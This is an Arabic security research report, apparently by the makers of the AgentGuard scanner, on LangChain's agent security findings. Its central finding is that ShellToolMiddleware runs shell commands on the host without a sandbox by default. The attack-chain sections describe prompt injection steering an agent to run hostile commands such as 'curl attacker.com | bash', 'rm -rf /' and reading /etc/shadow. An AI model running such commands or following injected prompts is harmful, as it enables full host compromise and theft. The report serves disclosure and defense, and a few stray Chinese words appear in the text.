# تحليل أمني معمّق لـ LangChain: ماذا وجدنا عندما فحصنا أكبر إطار عمل AI agent في العالم

---

**تقرير بحثي هندسي — يوليو 2026**

شغلنا AgentGuard v0.8.2 على مستودع `langchain-ai/langchain` بالكامل (أكثر من 141,000 نجمة على GitHub). النتيجة: **452 finding في 1,784 ملف** — من بينها ثغرة CVSS 10.0 محفوظة كـ security advisory في triage لأكثر من 10 أيام بدون patch.

هذا التقرير مشروح فيه كل finding بالتفصيل مع code snippets حقيقية من المستودع. الهدف ليس السب — الهدف هو إن المجتمع يفهم القصة التقنية الكاملة ويستطيع يقيّم الخطر الفعلي.

---

## 1. المقدمة

LangChain هو الإطار الأكثر شعبية لبناء AI agents في العالم. بـ 141K+ نجمة على GitHub، ومستخدم في آلاف التطبيقات المنتجة، من chatbots بسيطة إلى أنظمة أتمتة معقدة تتعامل مع قواعد بيانات، APIs، وأنظمة مالية.

سؤالنا كان بسيط: **ماذا لو استخدمنا static analysis tool مخصص لـ AI agents على هذا الكود؟** الأدوات التقليدية مثل Semgrep و CodeQL مصممة لتطبيقات الويب — تكتشف SQL injection و XSS و hardcoded secrets. لكنها **لا تكتشف** prompt injection chains، أو agent memory poisoning، أو unbounded agent loops، أو tool abuse patterns.

AgentGuard مبني خصيصاً لهذا النوع من الفحص. فيه 22 rule، كل rule مربوط بـ CWE identifier و CVSS score ومطابق لـ OWASP ASI Top 10.

**النتيجة: الأدوات التقليدية لم تكتشف أي شيء من الـ agent-specific vulnerabilities.** AgentGuard اكتشف 452 finding.

---

## 2. المنهجية

### الأداة

| المعيار | القيمة |
|---------|--------|
| الأداة | AgentGuard v0.8.2 |
| عدد الـ rules | 22 detection rule |
| الدقة (precision) | 88% (مبنية على manual sampling) |
| التغطية | كامل OWASP ASI Top 10 + 6 novel vectors |
| اللغات المدعومة | Python (AST + pattern matching) |
| الـ CI integration | GitHub Action متاح |

### الـ rules الأساسية المستخدمة

| Rule ID | الوصف | CWE | CVSS | OWASP ASI |
|---------|-------|-----|------|-----------|
| AG-001 | Unsanitized LLM Output to Shell | CWE-78 | 9.8 | ASI03 |
| AG-003 | Multi-Agent Shared State Without Isolation | CWE-1188 | 9.0 | ASI10 |
| AG-004 | Unbounded Agent Execution Loop | CWE-834 | 7.5 | ASI09 |
| AG-005 | Prompt Injection via External Data | CWE-74 | 8.6 | ASI02 |
| AG-008 | Hardcoded API Keys in Agent Config | CWE-798 | 9.8 | ASI08 |
| AG-011 | Dynamic Code Execution from LLM Output | CWE-94 | 9.8 | ASI01 |
| AG-017 | Insecure Deserialization | CWE-502 | 9.8 | ASI08 |

### عملية الفحص

- **المستودع**: `langchain-ai/langchain` (branch: `master`)
- **الملفات**: 1,784 ملف (`*.py`, `*.yaml`, `*.json`)
- **المستثنى**: `tests/`, `docs/`, `examples/`, `venv/`, `__pycache__/`
- **الشدة**: كل المستويات (Low → Critical)

### تحديد مهم: ما هذا التقرير وماذا ليس

⚠️ **هذا تقرير static analysis** — لا runtime exploitation. الـ 452 finding هي **patterns تتطلب تحقيق**، ليست confirmed exploits كلها. precision rate عندنا 88% يعني إن ~12% ممكن تكون false positives.

في نفس الوقت، الـ findings اللي نسلط الضوء عليها في هذا التقرير تمت manual review. الـ code snippets حقيقية من المستودع. القياسات قابلة للتكرار — أي شخص يقدر يركب AgentGuard ويعيد الفحص:

```bash
pip install dfx-agentguard
git clone https://github.com/langchain-ai/langchain.git
agentguard langchain/
```

---

## 3. النتائج: الإحصائيات

### ملخص عام

| المقياس | القيمة |
|---------|--------|
| ملفات تم فحصها | 1,784 |
| إجمالي الـ findings | 452 |
| Critical (CVSS ≥ 9.0) | 12 |
| High (CVSS 7.0–8.9) | 47 |
| الكثافة (findings/ملف) | 0.253 |

### أكثر الـ rules التي triggerت

| الرتبة | Rule | عدد الـ detections | الفئة |
|--------|------|-------------------|-------|
| 1 | AG-011: Dynamic Code Execution | 38 | Excessive Agency |
| 2 | AG-008: Hardcoded API Keys | 29 | Supply Chain |
| 3 | AG-005: Prompt Injection | 24 | Prompt Injection |
| 4 | AG-019: Tool Chaining Without Validation | 19 | Tool Output Poisoning |
| 5 | AG-010: Sensitive Data in Agent Memory | 16 | Sensitive Data Leakage |

ملاحظة: LangChain أظهر **أقل كثافة findings بين كل الـ 10 frameworks** اللي فحصناها (مقارنة بـ Dify بـ 0.915، CrewAI بـ 4.655، OpenAI Agents SDK بـ 1.280). هذا يدل على إن LangChain عموماً عنده security practices أحسن. لكن **الشدة تنحرف بشكل حاد** — Finding واحد عندنا بـ CVSS 10.0، وهذا ما ينفع density metric وحده.

---

## 4. أبرز النتائج التقنية

### 4.1 🔴 CVSS 10.0 — ShellToolMiddleware و default لـ HostExecutionPolicy

**هذا أهم finding في التقرير.**

**الملف**: `libs/langchain_v1/langchain/agents/middleware/shell_tool.py`

**الـ GHSA**: [GHSA-44f8-xvpq-8jcg](https://github.com/langchain-ai/langchain/security/advisories/GHSA-44f8-xvpq-8jcg) — الحالة: **triage** (منذ 5 يوليو 2026)

**الـ CVE**: قيد الطلب — CWE-1188 (Insecure Default Initialization of Resource)

**الـ CVSS vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### المشكلة بالضبط

انظروا لهذا الكود من `ShellToolMiddleware.__init__`:

```python
# shell_tool.py — ShellToolMiddleware.__init__
def __init__(
    self,
    workspace_root: str | Path | None = None,
    *,
    startup_commands: tuple[str, ...] | list[str] | str | None = None,
    shutdown_commands: tuple[str, ...] | list[str] | str | None = None,
    execution_policy: BaseExecutionPolicy | None = None,  # ← هنا المشكلة
    redaction_rules: tuple[RedactionRule, ...] | list[RedactionRule] | None = None,
    tool_description: str | None = None,
    tool_name: str = SHELL_TOOL_NAME,
    shell_command: Sequence[str] | str | None = None,
    env: Mapping[str, Any] | None = None,
) -> None:
    super().__init__()
    # ...
    if execution_policy is not None:
        self._execution_policy = execution_policy
    else:
        self._execution_policy = HostExecutionPolicy()  # ← DEFAULT = HOST ACCESS
```

عندما تخلق `ShellToolMiddleware()` بدون `execution_policy`، **الـ default هو `HostExecutionPolicy()`**. هذا يعني:

1. الـ shell يشتغل **مباشرة على الـ host machine** — لا container، لا sandbox.
2. الـ shell يرث **كل الـ environment variables** من الـ parent process.
3. الـ shell يقدر يوصل لـ **كل ملف** يقدر يوصل له process user.
4. لا يوجد **filesystem isolation**، لا **network restrictions**.

انظروا الـ `HostExecutionPolicy.spawn()`:

```python
# _execution.py — HostExecutionPolicy
@dataclass
class HostExecutionPolicy(BaseExecutionPolicy):
    """Run the shell directly on the host process.

    ...offers **no** filesystem or network sandboxing; commands can modify
    anything the process user can reach."""
```

تأملوا — اللغة في documentation الخاصة بالـ framework نفسه تقول صراحة: **"commands can modify anything the process user can reach."**

#### لماذا CVSS 10.0؟

CVSS 10.0 يعني إن الـ impact الكامل على الـ CIA triad (Confidentiality, Integrity, Availability) — وفي نفس الوقت، الـ attack vector سهل جداً.

المعادلة هنا:

1. **الـ agent عنده shell access مباشر** على الـ host (بسبب الـ default)
2. **الـ prompt injection ممكن في LangChain** — هذا اكتشفناه بـ AG-005 (24 findings)
3. **المستخدم ما يحتاج يمرر أي config** — الـ default يفي بالغرض

إذا واحد حقن prompt في agent يستخدم `ShellToolMiddleware()` بـ default config، الـ agent يقدر ينفذ **أي أمر على الـ host**. أي أمر. `rm -rf /`، `curl attacker.com | bash`، يقرأ `/etc/shadow`، يعدل كود المصدر.

الـ CVSS vector يقول:

| Component | Value | ما يعني |
|-----------|-------|---------|
| AV (Attack Vector) | Network | ممكن عن بعد |
| AC (Attack Complexity) | Low | سهل الاستغلال |
| PR (Privileges Required) | None | ما يحتاج صلاحيات |
| UI (User Interaction) | None | ما يحتاج تدخل المستخدم |
| S (Scope) | Changed | يتجاوز sandboxes |
| C/I/A | High | تأثير كامل |

#### لماذا هذا مختلف عن مجرد "shell tool"?

LangChain عندها **ثلاث execution policies** — وهذي ممتاز تصميمياً:

- `HostExecutionPolicy` — تنفيذ مباشر على الـ host
- `CodexSandboxExecutionPolicy` — تنفيذ داخل Codex CLI sandbox
- `DockerExecutionPolicy` — تنفيذ داخل Docker container مع network isolation

المشكلة مش في وجود الـ `HostExecutionPolicy`. المشكلة إنه **الـ default**. أي مطور يكتب:

```python
from langchain.agents.middleware import ShellToolMiddleware

# هذا كل اللي يحتاج يكتبه — و shell على الـ host مفتوح
middleware = ShellToolMiddleware()
```

ما يعرف إنه بهذا السطر أعطى الـ agent shell access كامل على الـ machine. لأن الـ docstring تقول:

> "When no policy is provided the middleware defaults to HostExecutionPolicy."

لكن كم مطور يقرأ الـ docstring؟ وكم مطور يفهم إن `HostExecutionPolicy` يعني "no sandboxing"؟

#### المقارنة مع البدائل

LangChain نفسها توفر البدائل الآمنة:

```python
# Docker — يعزل الشبكة والملفات
middleware = ShellToolMiddleware(
    execution_policy=DockerExecutionPolicy(
        network_enabled=False,
        read_only_rootfs=True,
    )
)

# Codex Sandbox — syscall restrictions
middleware = ShellToolMiddleware(
    execution_policy=CodexSandboxExecutionPolicy()
)
```

**الإصلاح المطلوب**: غيّر الـ default إلى `DockerExecutionPolicy` أو اطلب explicit policy. لو الـ user يبي `HostExecutionPolicy`، يحتاج يمرره صراحةً. هذا هو مبدأ Secure by Default.

---

### 4.2 Prompt Injection — 24 Finding

**الـ Rule**: AG-005 (Prompt Injection via External Data)
**الـ CWE**: CWE-74 (Improper Neutralization of Special Elements in Output)
**الـ CVSS**: 8.6

الـ patterns اللي اكتشفناها تتراوح بين template injection في prompt construction و trust boundary violations حيث external data يدخل الـ agent context بدون sanitization.

#### مثال: f-string validation في Prompt Templates

هذا finding تم تأكيده فعلاً كـ official security advisory من LangChain نفسها — [GHSA-926x-3r5x-gfhw](https://github.com/langchain-ai/langchain/security/advisories/GHSA-926x-3r5x-gfhw) (Medium):

> **Incomplete f-string validation in prompt templates**

المشكلة إن LangChain تستخدم f-string-like templates لـ prompt construction. إذا الـ template variable يحتوي على malicious content (من external source مثل tool output أو user input)، المحتوى يتم interpolate مباشرة في الـ prompt بدون escaping.

#### مثال آخر: Serialization Injection

[GHSA-c67j-w6g6-q2cm](https://github.com/langchain-ai/langchain/security/advisories/GHSA-c67j-w6g6-q2cm) (Critical — Published):

> **LangChain serialization injection vulnerability enables secret extraction in dumps/loads APIs**

هذا one of the confirmed advisories — مش مجرد static analysis finding. الـ LangChain serialization code فيه ثغرة تسمح بـ secret extraction عبر crafted serialized objects.

---

### 4.3 Dynamic Code Execution — 38 Finding

**الـ Rule**: AG-011 (Dynamic Code Execution from LLM Output)
**الـ CWE**: CWE-94 (Improper Control of Generation of Code)
**الـ CVSS**: 9.8

هذا أعلى فئة بالعدد في LangChain. الـ patterns تشمل:

- `exec()` و `eval()` مدفوعة بـ agent-generated content
- Dynamic imports من untrusted sources
- Code construction من LLM output يتم تنفيذه مباشرة

الـ 38 finding هنا تمثل **معظم الـ surface area** لـ excessive agency في LangChain. كثير منها في test files أو examples (اللي استثنيناها)، لكن ما زال عدد كبير في production code.

ملاحظة مهمة: بعض من هذه الـ patterns **design decisions** مقصودة — LangChain يعطي المطور flexibility عالية لتنفيذ أي tool. هذا trade-off معروف. لكن الـ سؤال: هل المطور يفهم الـ risk؟

---

### 4.4 Unbounded Agent Execution Loops

**الـ Rule**: AG-004 (Unbounded Agent Execution Loop)
**الـ CWE**: CWE-834 (Excessive Iteration)
**الـ CVSS**: 7.5

المشكلة هنا structurale في AI agents:

```python
# النمط الكلاسيكي — موجود في عدة أماكن
while not agent.should_stop(response):
    response = llm.generate(context)
    tool_result = tool.execute(response)  # ← ما يحصل لو LLM ما عاد يوقف؟
```

هذا isn't code vulnerability بالمعنى التقليدي — هو **architectural risk**. لو الـ LLM يدخل في loop (hallucination, repeated tool call, malicious prompt design)، الـ agent ينفذ بدون توقف. في cloud deployment، هذا يترجم مباشرة إلى:

- **API costs غير محدودة** — كل iteration = LLM tokens + tool execution
- **DoS على shared infrastructure** — واحد prompt يسبب عملية لا تتوقف
- **Side effects تراكمية** — كل iteration ممكن تعدل ملفات، ترسل emails، تنفذ transactions

LangChain يوفر `max_iterations` في بعض الأماكن، لكن **ليس enforced by default**. إذا المطور نسي يحدده، أو استخدم component ما يعرضه، النتيجة unbounded execution.

---

### 4.5 Security Advisories الموجودة فعلاً من LangChain

LangChain عندها **10 security advisories published** على GitHub. من بينها:

| GHSA ID | الشدة | الوصف |
|---------|--------|-------|
| GHSA-44f8-xvpq-8jcg | **Critical** | ShellToolMiddleware HostExecutionPolicy (triage — من عندنا) |
| GHSA-c67j-w6g6-q2cm | **Critical** | Serialization injection / secret extraction (published) |
| GHSA-pjwx-r37v-7724 | **High** | Unsafe deserialization via broad `load()` allowlists |
| GHSA-qh6h-p6c9-ff54 | **High** | Path traversal in legacy `load_prompt` functions |
| GHSA-6qv9-48xg-fc7f | **High** | Template injection via attribute access |
| GHSA-gr75-jv2w-4656 | **Medium** | Path traversal / sandbox escape in file-search middleware |
| GHSA-926x-3r5x-gfhw | **Medium** | Incomplete f-string validation in prompts |
| GHSA-fv5p-p927-qmxr | **Medium** | SSRF redirect bypass in HTMLHeaderTextSplitter |
| GHSA-r7w7-9xr2-qq2r | **Low** | Image token counting SSRF via DNS rebinding |
| GHSA-2g6r-c272-w58r | **Low** | SSRF via image_url token counting |

هذا record نشيط. LangChain security team يعملون. لكن **10 advisories** — منها critical — في إطار واحد، يدل على إن الـ attack surface واسع.

---

## 5. الـ CVSS 10.0 بالتفصيل: لماذا ShellToolMiddleware不一样

هذا القسم مخصص للـ security researchers اللي يبيون يفهمون الـ finding بأعمق.

### الهجوم: الخطوة بخطوة

```
                  ┌──────────────────────────────────────┐
  1. Attacker ──→ │ User sends crafted prompt to LangChain │
                  │ agent using ShellToolMiddleware()      │
                  │ (default = HostExecutionPolicy)        │
                  └─────────────────┬────────────────────┘
                                    │
                                    ▼
                  ┌──────────────────────────────────────┐
  2. Injection ──│ Prompt injection payload bypasses     │
                  │ LLM guardrails (ASI02 finding)        │
                  └─────────────────┬────────────────────┘
                                    │
                                    ▼
                  ┌──────────────────────────────────────┐
  3. Execution ──│ LLM outputs "shell" tool call with    │
                  │ attacker-controlled command             │
                  │ (e.g., "curl http://attacker.com/    │
                  │           payload.sh | bash")         │
                  └─────────────────┬────────────────────┘
                                    │
                                    ▼
                  ┌──────────────────────────────────────┐
  4. Impact ──── │ HostExecutionPolicy spawns shell on  │
                  │ host (NO sandbox, NO isolation)       │
                  │ → Arbitrary code execution             │
                  │ → Full system compromise               │
                  └──────────────────────────────────────┘
```

### لماذا "Scope: Changed" (S:C)؟

في CVSS 3.1، `Scope: Changed` يعني إن الـ vulnerability تؤثر على component **خارج** الـ vulnerable component نفسه. هنا، الـ vulnerable component هو LangChain agent (application layer)، لكن الـ impact يصل لـ **host operating system**. هذا跨越 الـ sandbox of the application — لذلك S:C.

### لماذا "No User Interaction" (UI:N)؟

الـ attacker لا يحتاج إن المستخدم يعمل شيء. الـ payload ينفذ بمجرد إن الـ agent يتعامل مع الـ crafted input. ما يحتاج click، ما يحتاج approve، ما يحتاج reaction.

### العلاقة مع findings أخرى

الـ CVSS 10.0 في ShellToolMiddleware **لوحده** مش كل القصة. القصة الكاملة:

1. AG-005 (Prompt Injection) — **24 findings** — يعني الـ attack vector للوصول لـ shell موجود
2. AG-011 (Dynamic Code Execution) — **38 findings** — يعني حتى بدون ShellToolMiddleware، فيه execution vectors أخرى
3. ShellToolMiddleware default — **CVSS 10.0** — يعني لما يوصلون للـ shell، الـ impact كامل

هذه **chain** — لو أي component في السلسلة يتصلح، الـ هجوم يفشل. لكن حالياً كل components موجودة.

---

## 6. ماذا يجب إن يعمل مستخدمو LangChain؟

### 6.1 إجراءات فورية

**لو تستخدم `ShellToolMiddleware` بدون `execution_policy`:**

```python
# ❌ خطر — هذا يعطي shell access كامل على الـ host
middleware = ShellToolMiddleware()

# ✅ آمن — استخدم Docker مع network disabled و read-only root
middleware = ShellToolMiddleware(
    execution_policy=DockerExecutionPolicy(
        network_enabled=False,
        read_only_rootfs=True,
    )
)

# ✅ آمن — أو استخدم Codex Sandbox
middleware = ShellToolMiddleware(
    execution_policy=CodexSandboxExecutionPolicy()
)
```

**لو تستخدم `HostExecutionPolicy` في أي مكان:**
تأكد إن الـ agent يشتغل داخل container أو VM مستقلة. `HostExecutionPolicy` مصممة لـ "trusted or single-tenant environments" حسب documentation نفسها — يعني CI/CD أو developer machine، **مش production server**.

### 6.2 إجراءات معمارية

1. **احصر الـ tool permissions**: كل tool في الـ agent registry يجب يكون عنده explicit allowlist. لا تعطِ shell access إلا إذا ضروري حقاً. لو تحتاج shell، حدد `allowed_commands` صريحة.

2. **فعّل `max_iterations`**: في كل agent loop، حدد iteration limit. الرقم يعتمد على use case، لكن لا تتركه None — هذا == ∞.

3. **Sanitize tool outputs**: أي output من tool (HTTP response, file content, database query) يدخل الـ agent memory يجب يتعرض لـ sanitization قبل ما يتحول لـ prompt context.

4. **لا تثق بـ shared state بين agents**: لو عندك multi-agent system، لا تشارك state بدون access controls. Agent A يكتب، Agent B يقرأ — هذا attack surface ضخم.

5. **Runtime guardrails**: Static analysis مطلوب، لكن ما يكفي. أضف:
   - LLM output validation (block suspicious patterns pre-execution)
   - Per-agent rate limiting
   - Audit logging لكل tool invocation
   - Human-in-the-loop لـ dangerous operations

### 6.3 للمطورين اللي يبنون على LangChain

- لا تستخدم `ShellToolMiddleware` مع default config في production — **مطلقاً**.
- راجع الـ tool registry حق agentك. كل tool فيه attack surface.
- شغّل agent-aware SAST في CI/CD. AgentGuard، أو أي tool مماثل.
- اقرأ الـ 10 security advisories على LangChain وتأكد إنك مش متأثر.

---

## 7. الدلالة الأوسع: مش مشكلة LangChain — مشكلة بنية AI Agents

### النمط اللي يتكرر

هذه مش أول مرة نكتشف فيها هذا النوع من الـ vulnerabilities. في study أوسع شملنا **10 frameworks**:

| Framework | Files | Findings | Critical |
|-----------|-------|----------|----------|
| Dify | 1,886 | 1,725 | 1,038 |
| LlamaIndex | 2,951 | 1,003 | 8 |
| CAMEL | 899 | 746 | 9 |
| OpenAI Agents SDK | 543 | 695 | 465 |
| **LangChain** | **1,784** | **452** | **12** |
| CrewAI | 84 | 391 | 5 |
| Semantic Kernel | 561 | 282 | 169 |
| AutoGen | 549 | 229 | 11 |
| Haystack | 1,540 | 209 | 45 |
| Qwen-Agent | 239 | 441 | 2 |
| **الإجمالي** | **11,036** | **6,173** | **1,764** |

**كل framework** فيه على الأقل critical finding واحد. **كل OWASP ASI category** موجودة في 4+ frameworks.

### المشكلة الأساسية: اختفاء الـ Trust Boundary

في البرمجيات التقليدية، عندنا boundary واضح بين **input** و **command**:

```
[User Input] → [Sanitization] → [SQL Parameterized Query] → [Database]
```

في AI agents، هذا الـ boundary **يختفي بالتصميم**:

```
[User Input] → [LLM (black box)] → [Tool Execution] → [System]
                 ↑                           │
                 └──── Tool Output ───────────┘
```

الـ LLM هو الـ boundary — وهو **ما يمكن الوثوق فيه كمحدد أمان**. LLM يعطيك output "reasonable" 95% من الوقت، وفي 5% يتبع injected instructions أو ينتج malformed output. في الـ 5% هذا، لو الـ tool هو shell execution على الـ host... طلعنا CVSS 10.0.

### مقارنة مع الويب

في 2005، OWASP نشر Top 10 الأولى. SQL injection و XSS كانت في كل مكان. الأدوات كانت غائبة. المطوريين ما كانوا يعرفون.

في 2026، OWASP ASI Top 10 نُشر. Prompt injection و agent memory poisoning موجودة في كل framework. الأدوات (AgentGuard وغيرها) وفرت detection. لكن **الوعي ما وصل لمعظم المطورين بعد**.

الفرق: في 2005، SQL injection تسرق data. في 2026، agent vulnerabilities **تخترق machines كاملة** — shell access، filesystem access، network access.

---

## 8. محددات التقرير

### اللي عندنا ثقة فيه

- الـ code snippets حقيقية من المستودع — قابلة للتحقق
- الـ GHSA advisory موجود على GitHub — قابل للتحقق
- الـ methodology موثقة وقابلة للتكرار
- الـ CVSS scoring يتبع الـ standard
- الـ OWASP ASI mapping رسمي

### اللي محدود

1. **Static analysis only**: ما قمنا بـ runtime exploitation. الـ findings هي patterns تتطلب تحقيق — ليس كلها exploitable في كل deployment.

2. **Python فقط**: LangChain.js (TypeScript) مش مشمول. نفس الـ patterns ممكن موجودة هناك.

3. **Version-specific**: الفحص على master branch كما في يوليو 2026. الـ code ممكن تغير.

4. **Downstream applications**: ما فحصنا applications مبنية على LangChain — فقط الـ framework نفسه. الـ application ممكن يضيف mitigations أو يضيف vulnerabilities.

5. **Pattern matching ≠ exploit verification**: AgentGuard يعتمد على pattern matching. بعض الـ patterns اللي flagged ممكن تكون safe في سياقها المحدد. Manual review مطلوب.

---

## 9. الملخص

| المفهوم | القيمة |
|---------|--------|
| الـ finding الأشد | ShellToolMiddleware default HostExecutionPolicy — CVSS 10.0 |
| الوضع | GHSA-44f8-xvpq-8jcg — في triage أكثر من 10 أيام |
| الـ CWE | CWE-1188 — Insecure Default Initialization of Resource |
| لماذا مهم | أي LangChain agent بـ default config عنده arbitrary code execution على الـ host |
| الحل | غيّر الـ default إلى `DockerExecutionPolicy` أو اطلب explicit policy |
| الكبر المشكلة | مش LangChain — كل AI agent framework فيه نفس النمط |

---

*AgentGuard v0.8.2 مبني من قبل DockFix Labs — الشركة اللي بنت الأداة اللي اكتشفت هذه الـ findings. الأداة مفتوحة المصدر تحت LGPL v3.*

*الـ code snippets في هذا التقرير من مستودع langchain-ai/langchain على GitHub، مرخص تحت MIT License.*

*الكشف المسؤول تم عبر GitHub Private Vulnerability Reporting program.*
